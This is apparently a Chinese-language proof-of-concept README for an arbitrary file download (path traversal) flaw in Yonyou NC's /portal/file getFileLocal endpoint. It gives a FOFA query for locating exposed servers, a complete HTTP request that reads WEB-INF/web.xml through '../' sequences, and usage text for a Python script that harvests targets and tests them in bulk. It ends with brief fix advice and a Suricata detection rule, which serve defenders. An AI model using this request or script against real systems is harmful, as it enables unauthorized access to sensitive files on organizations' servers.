### 产品简介  
用友NC是“企业资源规划（Enterprise Resource Planning）”的缩写，是指用友软件股份有限公司开发的一套企业管理软。用友NC系统是一种集成管理企业各项业务流程的信息化解决方案。该系统涵盖了财务、人力资源、供应链管理等多个方面，旨在帮助企业提高运营效率、优化资源利用、提升管理水平。  

### 漏洞概述  
用友NC getFileLocal 任意文件下载,攻击者可通过此漏洞获取敏感信息。  

### 指纹识别  
fofa: app="用友-UFIDA-NC" && title=="产品登录界面"

### 漏洞利用  
```
poc:
GET /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml HTTP/1.1
Host: xxxxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```
![Image text](https://github.com/YUUKI4O4/POC/blob/main/Yonyou_NC_getFileLocal_Arbitrary_File_Download_Vulnerability/1.png)

### 测试和利用脚本  
```
python3 Yonyou_NC_getFileLocal_Arbitrary_File_Download_Vulnerability.py -h
usage: Yonyou_NC_getFileLocal_Arbitrary_File_Download_Vulnerability.py [-h] [-t] [-r FILE] [-u URL]

### Yonyou NC getFileLocal Arbitrary File Download Vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python
                        Yonyou_NC_getFileLocal_Arbitrary_File_Download_Vulnerability.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python
                        Yonyou_NC_getFileLocal_Arbitrary_File_Download_Vulnerability.py -u
                        http://xxx.xxx.xxx
```

### 修复建议  
1、请联系厂商进行修复。  
2、如非必要，禁止公网访问该系统。  
3、设置白名单访问。  

### Suricata rules  
```
alert http any any -> any any (msg:"Yonyou NC getFileLocal Arbitrary File Download Vulnerability"; flow:established,to_server;  content:"get";http_method;nocase; content:"/portal/file?cmd=getFileLocal&fileid=";http_uri;fast_pattern;nocase; content:"../../";http_uri;distance:0; reference:url,https://github.com/YUUKI4O4/POC/tree/main/Yonyou_NC_getFileLocal_Arbitrary_File_Download_Vulnerability;  classtype:web-attck; metadata:created_at 2024-01-29,updated_at 2024-01-29,creater:YUUKI4O4; sid:24; rev:1;)
```
